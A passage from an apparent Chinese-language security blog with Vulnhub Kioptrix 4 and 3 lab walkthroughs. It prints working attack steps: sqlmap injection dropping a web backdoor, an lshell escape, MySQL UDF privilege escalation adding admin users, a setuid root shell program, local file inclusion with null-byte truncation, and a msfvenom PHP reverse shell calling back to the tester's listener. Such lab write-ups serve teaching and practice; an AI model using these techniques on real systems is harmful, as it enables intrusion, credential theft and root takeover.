fetching current user</span><br><span class="line">current user is DBA:    True</span><br><span class="line">[02:00:45] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/10.32.58.187&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 02:00:45</span><br></pre></td></tr></table></figure>
<p>通过注入得到用户名和密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: members</span><br><span class="line">Table: members</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| id | username | password              |</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| 1  | john     | MyNameIsJohn          |</span><br><span class="line">| 2  | robert   | ADGAdsafdfwt4gadfga== |</span><br><span class="line">+----+----------+-----------------------+</span><br></pre></td></tr></table></figure>
<p>通过<code>--os-shell</code>写入一个<code>webshell</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&apos;]_____ ___ ___  &#123;1.2.4#stable&#125;</span><br><span class="line">|_ -| . [.]     | .&apos;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 02:09:06</span><br><span class="line"></span><br><span class="line">[02:09:06] [INFO] resuming back-end DBMS &apos;mysql&apos; </span><br><span class="line">[02:09:06] [INFO] testing connection to the target URL</span><br><span class="line">[02:09:06] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:09:06] [INFO] going to use a web backdoor for command prompt</span><br><span class="line">[02:09:06] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line">&gt; 4</span><br><span class="line">[02:09:08] [INFO] retrieved the web server document root: &apos;/var/www&apos;</span><br><span class="line">[02:09:08] [INFO] retrieved web server absolute paths: &apos;/var/www/checklogin.php&apos;</span><br><span class="line">[02:09:08] [INFO] trying to upload the file stager on &apos;/var/www/&apos; via LIMIT &apos;LINES TERMINATED BY&apos; method</span><br><span class="line">[02:09:08] [INFO] the file stager has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpuadle.php</span><br><span class="line">[02:09:08] [WARNING] unable to upload the file through the web file stager to &apos;/var/www/&apos;</span><br><span class="line">[02:09:08] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span><br><span class="line">do you want to try the same method used for the file stager? [Y/n] </span><br><span class="line">[02:09:09] [INFO] the backdoor has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpbcphh.php</span><br><span class="line">[02:09:09] [INFO] calling OS shell. To quit type &apos;x&apos; or &apos;q&apos; and press ENTER</span><br><span class="line">os-shell&gt; id</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;uid=33(www-data) gid=33(www-data) groups=33(www-data)&apos;</span><br><span class="line">os-shell&gt; whoami</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;www-data&apos;</span><br><span class="line">os-shell&gt; cat checklogin.php</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">$host=&quot;localhost&quot;; // Host name</span><br><span class="line">$username=&quot;root&quot;; // Mysql username</span><br><span class="line">$password=&quot;&quot;; // Mysql password</span><br><span class="line">$db_name=&quot;members&quot;; // Database name</span><br><span class="line">$tbl_name=&quot;members&quot;; // Table name</span><br></pre></td></tr></table></figure>
<p>但是权限很小。但是得到了数据库的账号密码。</p>
<h3><span id="通过ssh连接">通过SSH连接</span></h3><p>利用SQL注入得到的用户名密码SSH登录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh john@10.32.58.187</span><br><span class="line">The authenticity of host &apos;10.32.58.187 (10.32.58.187)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;10.32.58.187&apos; (RSA) to the list of known hosts.</span><br><span class="line">john@10.32.58.187&apos;s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&apos;t screw up</span><br><span class="line">Type &apos;?&apos; or &apos;help&apos; to get the list of allowed commands</span><br><span class="line">john:~$ id</span><br><span class="line">*** unknown command: id</span><br><span class="line">john:~$ ?</span><br><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br><span class="line">john:~$ help help</span><br><span class="line">Limited Shell (lshell) limited help.</span><br><span class="line">Cheers.</span><br></pre></td></tr></table></figure>
<p>从这里我们可以利用的命令有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br></pre></td></tr></table></figure>
<p>重点其中有一个是<code>echo</code>。</p>
<p>我们可以利用他得到一个<code>bash交互shell</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john:~$ echo os.system(&apos;/bin/bash&apos;)     </span><br><span class="line">john@Kioptrix4:~$ id</span><br><span class="line">uid=1001(john) gid=1001(john) groups=1001(john)</span><br></pre></td></tr></table></figure>
<p>权限还是当前用户的权限。</p>
<h3><span id="mysql数据库提权">MySQL数据库提权</span></h3><p>利用SQL注入得到的数据库账号密码登录MySQL数据库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3520</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; status;</span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2</span><br><span class="line"></span><br><span class="line">Connection id:		3520</span><br><span class="line">Current database:	</span><br><span class="line">Current user:		root@localhost</span><br><span class="line">SSL:			Not in use</span><br><span class="line">Current pager:		stdout</span><br><span class="line">Using outfile:		&apos;&apos;</span><br><span class="line">Using delimiter:	;</span><br><span class="line">Server version:		5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line">Protocol version:	10</span><br><span class="line">Connection:		Localhost via UNIX socket</span><br><span class="line">Server characterset:	latin1</span><br><span class="line">Db     characterset:	latin1</span><br><span class="line">Client characterset:	latin1</span><br><span class="line">Conn.  characterset:	latin1</span><br><span class="line">UNIX socket:		/var/run/mysqld/mysqld.sock</span><br><span class="line">Uptime:			1 hour 10 min 47 sec</span><br></pre></td></tr></table></figure>
<p>尝试<code>mysql udf 提权</code>。</p>
<p>在Windows环境下，执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line">CREATE TABLE npn(line blob);</span><br><span class="line">INSERT INTO npn values(load_file(&apos;C://xampplite//htdocs//mail//lib_mysqludf_sys.dll&apos;));</span><br><span class="line">SELECT * FROM mysql.npn INTO DUMPFILE &apos;c://windows//system32//lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS integer SONAME &apos;lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">SELECT sys_exec(&quot;net user npn npn12345678 /add&quot;);</span><br><span class="line">SELECT sys_exec(&quot;net localgroup Administrators npn /add&quot;);</span><br></pre></td></tr></table></figure></p>
<p>实现提权。</p>
<p>我们在实验环境下进行Linux环境下的UDF提权操作。</p>
<p>首先找到<code>lib_mysqludf_sys.so</code>的目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function sys_exec returns integer soname &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">ERROR 1125 (HY000): Function &apos;sys_exec&apos; already exists</span><br><span class="line">mysql&gt; select sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| NULL                                                | </span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ cat /tmp/out</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
<p>这样就将<code>sys_exec()</code>函数执行的结果写入到了<code>/tmp/out</code>下。</p>
<p>得知可以得到root权限。</p>
<p>可以写一个c语言程序进行命令执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(0); setgid(0); system(“/bin/bash”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地编译上传到目标靶机。</p>
<p>这里我用wget下载好像一下连接超时。可能是防火墙阻止流量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin&apos;);</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin john&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(&apos;usermod -a -G admin john&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure>
<p>利用<code>SELECT sys_exec(&#39;usermod -a -G admin&#39;);</code>将<code>john</code>加入管理员组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/tmp$ sudo su</span><br><span class="line">[sudo] password for john: </span><br><span class="line">root@Kioptrix4:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Kioptrix4:/tmp# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>这样我们得到了root权限。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Vulnhub渗透测试练习-Kioptrix 3]]></title>
      <url>https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-3.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="信息收集">信息收集</span></h2><p>同样用<code>netdiscover</code>发现目标主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.194.0/16   |   Screen View: Unique Hosts          </span><br><span class="line">                                                                               </span><br><span class="line"> 13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780              </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      6     360  Xiaomi Communications Co Ltd</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      2     120  Intel Corporate             </span><br><span class="line"> 192.168.43.58   00:0c:29:b2:76:40      4     240  VMware, Inc.                </span><br><span class="line"> 192.168.43.158  00:0c:29:38:2d:6f      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure>
<p>目标IP为<code>192.168.43.158</code>。</p>
<p>用nmap扫描目标主机端口信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS -n 192.168.43.158</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-08 07:45 EDT</span><br><span class="line">Nmap scan report for 192.168.43.158</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.53 ms 192.168.43.158</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds</span><br></pre></td></tr></table></figure>
<p>由扫描信息可以得到</p>
<ul>
<li>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li>
<li>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li>
<li>OS details: Linux 2.6.9 - 2.6.33</li>
</ul>
<p>80端口可以看出cms为<code>Lotus CMS</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_4.png" alt=""></p>
<p>用<code>dirb</code>扫描一下网站目录。也可以用御剑扫描目录。发现存在<code>phpdamin</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_5.png" alt=""></p>
<p>cms后台<code>http://192.168.43.158/index.php?system=Admin</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p>
<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="文件包含amp后台上传">文件包含&amp;后台上传</span></h3><p>访问80端口上的WEB服务。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_1.png" alt=""></p>
<p>发现url中有点问题</p>
<p><code>http://192.168.43.158/index.php?system=Blog</code></p>
<p>尝试<code>system=../../../../../etc/passwd</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_2.png" alt=""></p>
<p>好像不行，尝试<code>%00.</code>截断，发现可以读到<code>/etc/passwd</code></p>
<p><code>http://192.168.43.158/index.php?system=../../../../../../../../etc/passwd%00.</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_3.png" alt=""></p>
<p>这里可以结合后面SQLmap跑出来的后台密码得到了一个shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.177 LPORT=443 -f raw &gt; /tmp/evil.jpg</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">No Arch selected, selecting Arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure>
<p>用<code>msfvenom</code>生成一个图片马</p>
<p>我们在后台上传图片的地方上传一个图片</p>
<p>修改已有的图片，并得到图片的名，</p>
<p>利用msf监听端口</p>
<p>利用文件包含，包含上传图片，这个地方比较鸡肋。因为这个绝对路径我们是得不到的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/thumb_1a2o44437j.jpg%00.</span><br></pre></td></tr></table></figure>
<p>访问返回一个shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 192.168.43.177</span><br><span class="line">LHOST =&gt; 192.168.43.177</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.177:443 </span><br><span class="line">[*] Sending stage (37775 bytes) to 192.168.43.158</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.177:443 -&gt; 192.168.43.158:51226) at 2018-05-08 12:53:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/www/kioptrix3.com</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-15 09:21:17 -0400  cache</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  core</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  data</span><br><span class="line">100644/rw-r--r--  23126  fil   2011-04-14 12:23:13 -0400  favicon.ico</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2011-04-14 11:32:31 -0400  gallery</span><br><span class="line">100644/rw-r--r--  26430  fil   2011-04-14 12:23:13 -0400  gnu-lgpl.txt</span><br><span class="line">100644/rw-r--r--  399    fil   2011-04-14 12:23:13 -0400  index.php</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  modules</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  style</span><br><span class="line">100644/rw-r--r--  243    fil   2011-04-14 12:23:13 -0400  update.php</span><br></pre></td></tr></table></figure>
<p>权限有点小，很多命令都执行不了的。</p>
<h3><span id="sqlmap进行sql注入">SQLmap进行SQL注入</span></h3><p>这个站是有的链接有问题，302跳转到<code>kioptrix3.com</code></p>
<p>在<code>etc/passwd</code>添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.158  kioptrix3.com</span><br></pre></td></tr></table></figure>
<p><code>service networking restart</code>重启服务</p>
<p>发现url存在SQL注入。<code>kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_7.png" alt=""></p>
<p>先用<code>sqlmap</code>进行注入测试，id存在报错注入。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_8.png" alt=""></p>
<p>尝试查找下后台管理员账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>得到管理员账号密码，但是在</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p>
